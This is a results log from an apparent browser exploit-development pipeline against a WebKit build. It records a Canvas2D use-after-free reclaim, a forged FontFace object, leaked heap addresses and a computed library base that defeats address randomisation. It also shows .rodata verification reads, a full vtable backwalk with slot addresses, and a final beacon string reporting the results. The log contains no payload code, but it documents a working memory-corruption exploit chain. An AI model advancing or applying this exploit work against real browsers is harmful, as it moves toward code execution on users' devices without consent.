# p809v25e37 try=17 — RODATA-VERIFY + VTAB-BACKWALK Results

Date: 2026-11-12 00:37 UTC
Probe: p809v25e37.html (Canvas2D UAF + FontFace forge + rodata verify + vtable backwalk)
Source IP: 192.168.1.37
Log: beacon_logs/beacons_4e841472-cb97-4c0b-88cb-fb9126621586.log

## Phase 1-2: UAF Reclaim + Self-Scan

| Field | Value |
|-------|-------|
| Try | 17 (counter from crash-loop recovery) |
| L1 (ArrayBuffer) | 0x10008a6220 |
| L2 (ArrayBuffer) | 0x10009f4090 |
| Forge | OK |
| FontFace family | OK |
| Oracle alive | offset=0x4 |
| Self-scan addr | 0x1000384000 |
| Vtab from self | 0x1000384180 |

## Phase 3: Walk Chain

| Step | Value |
|------|-------|
| W1 IM (internal member) | 0x10009f4090 |
| W2 FO (FontFace object) | 0x1000160890 |
| W3 VP (vtable pointer) | 0x8100cdb28 |
| W3 fo+0x08 | 0x10009f4090 |
| W3 fo+0x18 | 0x10007a7000 |
| BASE (VP - RVA_VP) | 0x808e80000 |

## RODATA-VERIFY (Grade M — 4/4 passed)

| # | RVA | q0 (8B LE) | q1 (8B LE) | ASCII decode | ok |
|---|-----|-----------|-----------|--------------|-----|
| 0 | 0x6FA5A5C | 0x6e6f6974636e7546 | 0x6c6961465a445400 | "Function" / "\0TDZFail" | true |
| 1 | 0x6FB1E17 | 0x6c61626f6c47534a | 0x534a0079786f7250 | "JSGlobal" / "Proxy\0JS" | true |
| 2 | 0x7274300 | 0x80fd7a477 | 0x8100f7138 | (pointer pair) | true |
| 3 | 0x7277138 | 0x80fe4b176 | 0x0 | (pointer + NULL) | true |

**Verdict: RVA_VP = 0x724DB28 UPGRADED from [I] to [M].**
BASE computed from this RVA produces correct reads at all 4 known .rodata offsets.

## VTAB-BACKWALK

Starting point: VP = 0x8100CDB28, offset_to_top = 0xFFFFFFFFFFFFFFE0 (-32)

### Backward scan (16-byte steps from VP-32)

| i | Address | q0 | q1 | isText(q0/q1) |
|---|---------|----|----|---------------|
| 0 | 0x8100CDB08 | 0x80DEBEC80 | 0x80E9BD7D0 | false/false |
| 1 | 0x8100CDAF8 | 0x80E9BD7B0 | 0x80E9BD410 | false/false |
| 2 | 0x8100CDAE8 | 0x80CE81750 | 0x80CE81750 | true/true |
| 3 | 0x8100CDAD8 | 0x80E9BD7A0 | 0x80CE81750 | false/true |
| 4 | 0x8100CDAC8 | 0x80E9BCE20 | 0x80E9BCFC0 | false/false |
| 5 | 0x8100CDAB8 | 0x0 | 0x80CFAC450 | false/true |

**HIT-SPLIT at i=5:** q0=0x0 (RTTI=NULL) at address 0x8100CDAB8.
Split detection: the 8-byte boundary falls within the 16-byte read.
- offset_to_top at 0x8100CDAB0 (not read, inferred from structure)
- RTTI ptr = 0x0 at 0x8100CDAB8
- First primary vfunc at 0x8100CDAC0

### Primary Vtable (PV)

| Field | Value |
|-------|-------|
| **PV address** | **0x8100CDAC0** |
| **PV_RVA** | **0x724DAC0** |
| VP address | 0x8100CDB28 |
| VP_RVA | 0x724DB28 |
| Gap PV→VP | 0x68 bytes = 11 primary vfunc slots + 16B secondary header |
| offset_to_top | -32 (0xFFFFFFFFFFFFFFE0) |
| RTTI pointer | 0x0 (NULL — WebKit non-RTTI build) |

### Primary Vtable Slots (PV-SLOT)

| Slot | RVA | Notes |
|------|-----|-------|
| 0 | 0x412C450 | Unique — likely destructor |
| 1 | 0x5B3CE20 | |
| 2 | 0x5B3CFC0 | |
| 3 | 0x5B3D7A0 | |
| 4 | 0x4001750 | Common stub (pure_virtual / __cxa_pure_virtual) |
| 5 | 0x4001750 | Common stub |
| 6 | 0x4001750 | Common stub |
| 7 | 0x5B3D7B0 | |
| 8 | 0x5B3D410 | |
| 9 | 0x503EC80 | Unique |
| 10 | (not dumped, at PV+0x50=0x724DB10) | |

### Secondary Vtable Slots (VSLOT — from VP)

| Slot | RVA | Notes |
|------|-----|-------|
| 0 | 0x5B3CFB0 | |
| 1 | 0x5B3CFE0 | |
| 2 | 0x4001750 | Common stub |
| 3 | 0x5B3D6B0 | |
| 4 | 0x4001750 | Common stub |
| 5 | 0x4001750 | Common stub |
| 6 | 0x5793400 | |
| 7 | 0x5B3D810 | |
| 8 | NULL (0x0) | End of vtable |
| 9 | NULL (0x0) | End of vtable |

## Summary

| Metric | Value | Grade |
|--------|-------|-------|
| RVA_VP | 0x724DB28 | **M** (was I, now measured) |
| PV_RVA | 0x724DAC0 | **M** (new, measured) |
| BASE (this pipeline) | 0x808E80000 | M |
| Primary vtable slots | 11 (10 dumped) | M |
| Secondary vtable slots | 8 valid + 2 NULL | M |
| Total syncRead16 calls | 22 | |
| .text range (vfuncs) | BASE+0x3F00000 to BASE+0x5C00000 | M |

## RESULT beacon (final)

```
P809-RESULT:PV=0x8100cdac0,PV_RVA=0x724dac0,VP=0x8100cdb28,VP_RVA=0x724db28,gap=11slots,nReads=22
```
